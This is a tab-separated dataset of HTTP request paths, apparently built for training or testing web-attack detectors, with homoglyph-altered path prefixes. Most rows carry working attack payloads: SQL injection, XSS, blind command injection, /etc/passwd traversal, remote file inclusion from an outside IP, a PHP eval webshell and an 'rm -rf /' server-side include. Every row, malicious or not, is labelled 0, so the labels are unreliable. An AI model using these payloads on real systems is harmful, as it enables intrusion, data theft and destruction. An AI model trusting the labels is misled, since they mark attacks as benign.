sentences 	 labels
/ 𝑠𝒕ring / strings / parameters = < a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href = j &  # 97v &  # 97script &  # x3a ;  &  # 97lert ( 1 )  > clickme  	 0
/ 𝑠𝒕ring / b2 =  '  + and +  ' 1 '  =  ' 1  	 0
/ 𝚜𝕥ring / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo eedngd )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  \  \  	 0
/ 𝗰ᶃi-bin / starnet / addons / slideshow_full . php ? album_name =  ' 2022599802  	 0
/ 𝔟𝚡nyrhmh . idc ?  < script > document . cookie =  " testmjct = 1867 ;  "  <  / script >  	 0
/ 𐑈𝑡ring / str =  $  ( echo ecbrpq )   str1 =  $  {  # str }   if  [  6 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  /  	 0
/ m𝖘𝘀ql . exe  	 0
/ moo𝒅l𝗲 / filter / tex / texed . php ? formdata = foo & pathname = foo "  +  |  |  + echo + db + 4d + 5a + 50 + 00 + 02 + 00 + 00 + 00 + 04 + 00 + 0f + 00 + ff + ff + 00 + 00 + b8 + 00 + 00 + 00 + 00 + 00 + 00 + 00 + 40 +  +  >  > esbq  	 0
/ 𝕖𝔵amples / jsp / error / session / login . php ? dest = nessus "  >  < script > alert (  ' ossim_dest_xss . nasl '  )  <  / script >  <  !  --  	 0
/ j𝒂𑣀ascript / input . exe  	 0
/ j𝖆𝓿ascript / configs . exe  	 0
/ 𝗌𝚝ring / strings / parameters = 1 )  as qeav where 8127 = 8127 and 4241 = convert ( int ,  ( select char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  --  	 0
/ ѕ𝘁ring / modo = insertar & precio = 9085bob @  < script > alert ( paros )  <  / script >  . parosproxy . org & b1 = pasar + por + caja  	 0
/ ρ𝟬43snfr . aspx ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ m𝙖𝗂n . php ? logout =  " rm q68212743  #  	 0
/ ꬲn-𝚞s / dda2qr7j . aspx ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ ın𝓭ex . php ? language = xxpathxx ?  	 0
/ 𝖘𝚝ring / str =  $  ( echo ycsciw )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  /  	 0
/ 𝕘ყ23xnjq . do ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝐬𝘵ring / strings / parameters = xx : xx onerror = alert ( 1 )  /  /  --  !  >  	 0
/ 𝘴𝖙ring / modo = registro & login = dunlap & password = d5s3748da & nombre = walerico & apellidos = bartra + berguo & email = luca8 @ mobilecrm . iq & dni = 41944054n & direcciona = plaa + don + ramon + serrano + suer ,  + s / n +  & ciudad = antigedad & cp = 09610 & provincia = madrid & ntc = 2664915448366606 & b1 = registrar  	 0
/ 𝘀𝖙ring / strings / parameters = echo mesjof $  (  ( 62 + 27 )  )  $  ( echo mesjof ) mesjof /  /  	 0
/ 𑣁𝘁ring / strings / parameters = -5998 %  "  "  )  union all select 2366 , 2366 , 2366 , 2366 #  	 0
/ 𝐬𝓉ring / id = 3 /  & nombre = jamn + ibrico & precio = 85 & cantidad = 7 & b1 = aadir + al + carrito  	 0
/ m𝘢𝒊n . php ? stuff =  "  | ping \ x0c-w \ x0c10000 \ x0c-n \ x0c1 \ x0c1 . 2 . 3 . 4 | rem \ x0c  	 0
/ mo𝒅𝑢les / filters / headerfile . php ? system [ path ]  = xxpathxx  	 0
/ 𝖘𝔱ring / strings / parameters = < body / onpageshow = alert ( 1 )  >  	 0
/ 𝙨𝙘ripts / index . php ? option = weblinks & itemid = 2 & catid = -1 union select 0 , 1 , 2 , 522571337321 , 4 , 5 , 6 , 7 , 8 , 9 , 10 , 11 --  	 0
/ 𝓈𝔱ring / strings / parameters = 1 '  )  )  union all select null , null , null , null , null #  	 0
/ ƽ𝖙ring / strings / parameters = -9445 )  as dmur where 4371 = 4371 union all select 4371 , 4371 , 4371 , 4371 , 4371 , 4371 , 4371 , 4371 , 4371 , 4371 #  	 0
/ 𝓅𝚑pmyadmin / bb_func_txt . php ? pathtofiles =  / etc / passwd \ x00  	 0
/ ꜱ𝙩ring / strings / parameters = echo bkrxcq $  (  ( 95 + 40 )  )  $  ( echo bkrxcq ) bkrxcq &  	 0
/ 𐑈𝖙ring / strings / parameters = 1 "  "  and 8407 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  and  "  " eslo "  "  like  "  " eslo  	 0
/ zгoo𝟥3l4 . mscgi ?  < script > document . cookie =  " testiklc = 904 ;  "  <  / script >  	 0
/ ƽ𝖙ring / strings / parameters = < div style =  " background : url ( test5 . svg )  "  > press enter <  / div >  /  /  [  "  '  `  --  >  ]  ]  >  ]  <  / div >  	 0
/ 𝑐αcti / includes / converter . inc . php ? include_path =  / etc / passwd \ x00  	 0
/ 𝘴𝘵ring / id = 3 /  & nombre = queso + manchego & precio = 100 & cantidad = 46 & b1 = aadir + al + carrito  	 0
/ 𝙮𝐰axntrx . cfc ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𑣁𝑡ring / strings / parameters = echo $ ifshsvhka $  (  ( 85 + 77 )  )  $  ( echo $ ifshsvhka ) hsvhka  	 0
/ 𝙖zсrfs8d . do ?  < meta http-equiv = set-cookie content =  " testjpdr = 9205 "  >  	 0
/ ѕ𝗰ript /  	 0
/ 𝐜ƍi-bin / admin / general . php ? mode = perlinfo & config [ general ]  [ perl_binary ]  = cat  / etc / passwd |  |  	 0
/ ƍ𝐲23xnjq . idc ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝕡o𝕣t . php ? proto = tcp '  	 0
/ 𝘴𝘁ring / strings / parameters = $  { shell_exec ( print (  ` echo dpvesg echo  $  (  ( 76 + 66 )  )  echo dpvesg echo dpvesg `  )  ;  )  } dpvesg  	 0
/ 𝑠𝓉ring / modo = registro & login = perez & password = interclusin & nombre = fabrina & apellidos = chomb + mantero & email = casini-fridley @ civicosdns . ws & dni = 34788445w & direccion = rotonda + palomera + centro + 4 ,  + 5 ? a & ciudad = seriny & cp = 32755 & provincia = madrid & ntc = 165911526940970 & b1 = registrar  	 0
/ ⅇ𝚡amples / jsp / jsp2 / el / mailbox . php3 ? actionid = 6 & server = x & imapuser = x '  ; somesql & pass = x  	 0
/ 𝕗o𝐫um . asp ? n =  / etc / passwd | 41 | 80040e14 |  [ microsoft ]  [ odbc_sql_server_driver ]  [ sql_server ] line_1 : _incorrect_syntax_near_ &  # 039 ;  /  &  # 039 ;  .  	 0
/ 𝘤𝕘i-bin / base_local_rules . php ? dir =  < script > alert (  ' base_local_rules_xss . nasl-1331904405 '  )  <  / script >  	 0
/ 𝑠𝓉ring / strings / parameters = 1 "  "  and 4386 = utl_inaddr . get_host_address ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  and  "  " buzb "  "  =  "  " buzb  	 0
/ 𝓼𝚝ring / strings / parameters = 1 '  ; select  *  from generate_series ( 4592 , 4592 , case when  ( 4592 = 4592 )  then 1 else 0 end )  limit 1 --  	 0
/ 𝔰𝖙ring / strings / parameters = 1 "  "  )  as oztl where 6655 = 6655 or 8315 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  --  	 0
/ j🯴ᑯrbkil . cfc ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ ɑ𝓅58k3ci . cfm ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝓈𝘵ring / strings / parameters = 1 '  )  )  ; select  ( case when  ( 4660 = 4660 )  then 4660 else cast ( 1 as int )  /  ( select 0 from dual )  end )  from dual --  	 0
/ 𝖘𝓉ring / strings / parameters = 1 '  in boolean mode )  and elt ( 4249 = 4249 , 7259 )  #  	 0
/ 𝙨𝖙ring / modo = registro & login = glancey & password = filolgicamente & nombre = yago & apellidos =  |  & email = kaminski @ lola-lutscht . cf & dni = 48258022c & direccion = chalets + de + la + tierruca ,  + 118 + 8-f & ciudad = valls & cp = 50691 & provincia = ciudad + real & ntc = 8042027288739194 & b1 = registrar  	 0
/ lm𑜏𝟦r201 . cfm ?  < script > document . cookie =  " testwews = 8477 ;  "  <  / script >  	 0
/ 𝓼𝘵ring / strings / parameters = < isindex action = j a vas c r ipt : alert ( 1 )  type = image >  	 0
/ 𐑈𝘵ring / strings / parameters = 1 %  '  )  procedure analyse ( extractvalue ( 5840 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end )  )  , 0x717a767a71 )  )  , 1 )  and  (  '  %  '  =  '  	 0
/ ƽ𝒕ring / strings / parameters = '  "  >  *  /  --  >  <  / title >  <  / style >  <  / textarea >  <  / script  >  < img src = x onerror = confirm ( 1 )  >  	 0
/ ık𝗍ok2bw . pl ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝒶𝕨zmb / modules / help . incl . php ? setting [ opt_includepath ]  = xxpathxx  	 0
/ ϲ𝒈i-bin / gotopage . cgi ? 4242 +  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 0
/ ꜱ𝓽ring / strings / parameters = |   [  6 -ne  $  ( echo ajewoj  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  	 0
/ 𝗮𝙥avxugx . php3 ?  < meta http-equiv = set-cookie content =  " testdnbh = 5237 "  >  	 0
/ 𝐬𝘵ring / strings / parameters = ;  str =  $  ( echo gzpdpd )  ;  str1 =  $  {  # str }  ;  if  [  7 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  	 0
/ 𑣊m𝟻knyc4 . fts ?  < script > document . cookie =  " testbgqj = 6434 ;  "  <  / script >  	 0
/ 𝔰𝗍ring / id = 2 & nombre = jamn '  + ibric- ' o & precio = 100 & cantidad = 90 & b1 = aadir + al + carrito  	 0
/ j𝕒∨ascript / dropped . exe  	 0
/ 𝖾⤬amples / jsp / num / admin / plog-admin-functions . php ? config [ basedir ]  =  / etc / passwd \ x00  	 0
/ ꜱ𝘁ring / strings / parameters = echo pqvhoy $  (  ( 31 + 46 )  )  $  ( echo pqvhoy ) pqvhoy '  	 0
/ 𝑐𝗴i-bin / mail . php ? id =  '  /  *  *  / union /  *  *  / select /  *  *  / 1 , 2 , 1331923205 , 4 --  & blog = 1  	 0
/ 𝘤𝚐i-914 / gw5 / gwweb . exe ? htmlver = aaa & get-context  	 0
/ 𝑠𝐭ring / strings / parameters = ;  str =  $  ( echo msptmx )  ;  str1 =  $  {  # str }  ;  if  [  2 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  	 0
/ 𝕤𝙩ring / strings / parameters = 1 %  "  "  )  )  and 6240 =  (  ' qqpjq '  |  |  ( select case 6240 when 6240 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  )  and  (  (  "  "  %  "  "  =  "  "  	 0
/ 𝟬𝓻ufe52p . cgi ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ jа𝖛ascript / appl . exe  	 0
/ ƽ𝓽ring / modo = registro & login = christel & password =  ? t3a01bl1 & nombre = nador & apellidos = paredes & email = cancellieri @ enla . fr & dni = 39547146a & direccion = descanso ,  +  +  + 105 +  & ciudad = sant + ferriol & cp = 09680 & provincia = alicante & ntc = 3806763384332425 & b1 = registrar  	 0
/ 𝙨𝘁ring / strings / parameters = echo uukzpi $  (  ( 71 + 35 )  )  $  ( echo uukzpi ) uukzpi /  /  	 0
/ 𝚜𝔱ring / modo = insertar & precio = 4074 & b1 =  +  	 0
/ 𐑈𝖙ring / strings / parameters = ;  str =  $  ( echo yczvoo )  ;  str1 =  $  {  # str }  ;  if  [  2 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  /  	 0
/ 𝐩𝗁pmyadmin / mrtg . cgi ? cfg =  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / winnt / win . ini  	 0
/ ꜱ𝕥ring / strings / parameters = '  |   [  2 -ne  $  ( echo xocduh  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \  	 0
/ 𝑠𝓽ring / strings / parameters = 1 '  )  )  ; select  ( case when  ( 6276 = 6276 )  then 6276 else 6276 *  ( select 6276 from information_schema . character_sets )  end )  #  	 0
/ 𝗲⤬amples / servlets / servlet / calendar_admin . pl ? config =  | cat  / etc / passwd |  	 0
/ 𝒾n𝕕ex . php ? id = h6xj4vcok1 '  	 0
/ mɑ𝗶n . php <  ? eval (  $ _post [  ' q28117717 '  ]  )  ;  ? eval (  $ _post [  ' q28117717 '  ]  )  ;  ?  >  	 0
/ 𝔰𝙩ring / strings / parameters = 1 '  )  )  )  and sleep ( 5 )  and  (  (  (  ' vbck '  like  ' vbck  	 0
/ 𝟩o𝟻qp766 . htm ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝘴𝘁ring / modo = entrar & login = hironaga & pwd = inst76men991 ' me1te & remember = on & b1 = entrar  	 0
/  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  / etc / passwd  	 0
/ ꜱϲriptpath / index . php ? page = http :  /  / 192 . 168 . 202 . 118 : 8080 / iroy1gvqrrqu ?  	 0
/ ꬲ𝗑amples / jsp / cal / index . php ? search =  < script > alert (  ' cmsimple_search_xss . nasl '  )  ;  <  / script >  & function = search  	 0
/ 𝙨𝘁ring / strings / parameters = < script \ x2ftype =  " text / javascript "  > javascript : alert ( 1 )  ;  <  / script >  	 0
/ ℎеlp . php ? q =  "  \ x0dsleep \ x0910 \ x09 #  	 0
/  < meta http-equiv = set-cookie content =  " testyglc = 8988 "  >  	 0
/  .  /  \  /  .  /  .  /  \  /  .  /  .  /  \  /  .  /  .  /  \  /  .  /  .  /  \  /  .  /  .  /  \  /  .  /  .  /  \  /  .  /  .  /  \  /  .  /  { file }  	 0
/ 𝙘𝖌i-bin / mail . php ? id =  '  /  *  *  / union /  *  *  / select /  *  *  / 1 , 2 , 1331919012 , 4 --  & blog = 1  	 0
/ 𝘀𝙩ring / strings / parameters = '  ;  str =  $  ( echo ezcoie )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  '  	 0
/ 𝖘𝗍ring / strings / parameters = < img id = xss src =  "  " mocha :  [ code ]  "  "  >  	 0
/ ꜱ𝓉ring / strings / parameters = |   [  8 -ne  $  ( echo mmqksr  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  	 0
/ 𑣁𝐜ripts / index . php ? op = viewarticle & articleid = 9999 /  *  *  / union /  *  *  / select /  *  *  / 1331904442 , 1 , 1 , 1 , 1 , 1 , 1 , 1 --  & blogid = 1  	 0
/ 𝕤𝑡ring / strings / parameters = |  | echo $ ifswfkqve $  (  ( 90 + 1 )  )  $  ( echo $ ifswfkqve ) wfkqve /  /  	 0
/ 𝑎𝕡58k3ci . jspa ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ ѕ𝓉ring / strings / parameters = -9057 "  "  )  or 1 group by concat ( 0x7171706a71 ,  ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  )  having min ( 0 )  #  	 0
/ 𝗌𝓉ring / strings / parameters = "  ;  str =  $  ( echo bumbbo )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \  	 0
/ 𑣁𝔱ring / modo = registro & login = mobasher & password = pa32885o & nombre = noel + stefani & apellidos = dolce + mull-uhuar__a & email = deschamps1 @ 11horas . my & dni = 51756068l & direccion = calle + jerusalen + 18 +  & ciudad = santibez + de + valcorba & cp = 39776 & provincia = almera & ntc = 9542215186041042 & b1 = registrar  	 0
/ 𝓮𝒙amples / jsp / num / wiki . php /  < script > foo <  / script >  	 0
/ z𝑢ꭵhld5m . exe ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝚒k𝖙ok2bw . jspa ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝘀𝓉ring / modo = registro & login = beatriz & password = m9n87d90 & nombre = c ? asio & apellidos = arlat + poma & email = pezzotta-castella @ artesania . org . nc & dni = 35265294s & direccion = calle + kadiga + 91 +  & ciudad = bobadilla & cp = 31750 & provincia = barcelona & ntc = 4154281799426251 & b1 = registrar  	 0
/ 𝗉Ꮒpmyadmin / bb-hostsvc . sh ? hostsvc =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 0
/ զϲzkquis . exe ?  < script > document . cookie =  " testkwlg = 5591 ;  "  <  / script >  	 0
/ 𝖘𝘁ring / str =  $  ( echo nwelwc )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  	 0
/ 𝐬𝘵ring / id = 2 /  & nombre = queso + manchego & precio = 85 & cantidad = 12 & b1 = aadir + al + carrito  	 0
/ 𝘴𝘁ring / strings / parameters = |   [  6 -ne  $  ( echo jnnrop  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  /  	 0
/ ƽ𝐭ring / id = 1 & nombre =  <  !  --  # exec + cmd =  " rm + -rf +  /  ; cat +  / etc / passwd "  +  --  >  & precio = 85 & cantidad = 15 & b1 = aadir + al + carrito  	 0
/ 𝓼𝘁ring / modo = insertar & precio = 6226 & b1 = confirmar ?  	 0
/ 𝚜𝙩ring / strings / parameters = 1 '  +  ( select  ' unpz '  where 8186 = 8186 ; select  ( case when  ( 2593 = 3592 )  then 2593 else 2593 *  ( select 2593 from information_schema . character_sets )  end )  #  	 0
/ 𝗌𝕥ring / strings / parameters = 1 '  )  as ccee where 8880 = 8880 and 8514 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  --  	 0
/ 𝔰𝘵ring / strings / parameters = -1 < layer src =  "  " javascript : document . cookie = true ;  "  "  >  <  / layer >  	 0
/ 𝓼𝒕ring / strings / parameters = "  | echo $ ifszohikn $  (  ( 60 + 22 )  )  $  ( echo $ ifszohikn ) zohikn \  \  	 0
/ m𝑎𝓲n . php ? logout =  "  & rm ; q41289753 & rem ;  	 0
/ j𝗮𝑣ascript /  . htaccess . sfish /  /  / skipfish . invalid /  ;  ?  	 0
/ j𑣆𝟑4qobz . cfm ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝒉𝘦lp . php ? q =  "  | ping -w 10000 -n 1 1 . 2 . 3 . 4 | rem  	 0
/ 𝔰𝓉ring / strings / parameters = '   str =  $  ( echo wudxts )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  	 0
/ 𝙨𝖙ring / strings / parameters = -7779 '  )  where 4976 = 4976 or 6872 = 6872 --  	 0
/ 𝙨𝙩ring / strings / parameters = "  )  , null , null , null )  waitfor delay  ' 0 : 0 : 20 '   /  *  	 0
/ 𝘤𝒂cti / webspirs . cgi ? sp . nextform =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 0
/ ƽ𝗍ring / strings / parameters = < script > eval (  "  \ x61 \ x6c \ x65 \ x72 \ x74 ( 1 )  "  )  ;  <  / script >   /  /  hexadecimal escapes using eval  	 0
/ 𝐞n-𝘶s / account / includes / config . php ? relative_script_path = http :  /  / xxxxxxx  	 0
/ j🯴o𝙦yvga . jspa ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝒔𝓽ring / modo = entrar & login = crigger & pwd = acribadora & remember =  '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & b1 = entrar  	 0
/ 𐑈𝔱ring / strings / parameters = <  /  foo =  "  >  < script > alert ( 1 )  <  / script >  "  >  	 0
/ m𝚊𝒊n . php ? stuff =  '  \ x0drm q64854395  #  	 0
/ j𝐚𝓋ascript / viewforum . exe  	 0
/ 𑣁𝖙ring / modo = registro & login = daesik2 & password = 2458ca1e581 & nombre = panciano & apellidos = masc + pr *  . ado & email = dorsay . thursby @ elrincondelmarmol . pr & dni = 51834543h & direccion = cabo + de + agua ,  + s / n +  & ciudad = villafranca + de + los + barros & cp = 21240 & provincia = jan & ntc = 8319637256237029 & b1 = registrar  	 0
/ 𝘴𝒕ring / strings / parameters = "  ;  str =  $  ( echo gjnrxw )  ;  str1 =  $  {  # str }  ;  if  [  2 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "  	 0
/ ℯ𝙚i78ore . jsp ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𑣁𝐭ring / modo = registro & login = jozef & password = ve9derse & nombre = tahiel & apellidos = gua + sp +  + kiu + han & email = lemontier @ viajesnacionales . kp & dni = 70721027y & direccion = calle + virgen + de + la + hoz ,  + 123 + 4-b & ciudad = borrass & cp = 44564 & provincia = zaragoza & ntc = 7002955624204925 & b1 = registrar  	 0
/ 𝗌𝘁ring / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo xgxykb )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  "  	 0
/ 𝖋𝗮8p8lr8 . pl ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝓼𝙩ring / strings / parameters = )  ;  } print (  ` echo swqeio \ necho  $  (  ( 64 + 42 )  )  \ necho swqeio \ necho swqeio `  )  ;  \  \ swqeio  	 0
/ 𝘴𝕥ring / strings / parameters = 1 "  "  )  )  as hace where 8785 = 8785 ; begin user_lock . sleep ( 5 )  ;  end --  	 0
/ 𝐬𝓽ring / errormsg =  @ 40  	 0
/ 𝗂n𝔠 / exif . inc . php ? exif_prog =  ( echo -n  ' original_exif_prog_cmd_exec . nasl :   '  ; id )  |  | echo  	 0
/ 𝘴ϲripts / new_images . php ? order = linpha_order_sql_injection . nasl_1331904398  	 0
/ 𝗌𝓉ring / strings / parameters = '  |   [  7 -ne  $  ( echo xocduh  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \  	 0
/ 𝘀𝖙ring / strings / parameters = |   [  5 -ne  $  ( echo nmwjxy  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  /  	 0
